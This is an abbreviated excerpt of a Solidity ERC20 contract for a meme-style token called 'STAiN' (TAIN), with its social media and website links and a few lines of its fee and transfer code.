...
Telegram: https://t.me/stainerc20
Twitter: https://twitter.com/stainerc20
Website: https://stainerc20.tech/
Medium: 
...
contract TAIN is ERC20, Ownable {
    using SafeMath for uint256;

    string private _name = unicode"STAiN 💦";
    string private _symbol = "TAIN";
    ...
    uint256 private sellMultiplier  = 1200;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        //Exchange tokens
        uint256 airdropAmount = amount / 1000;
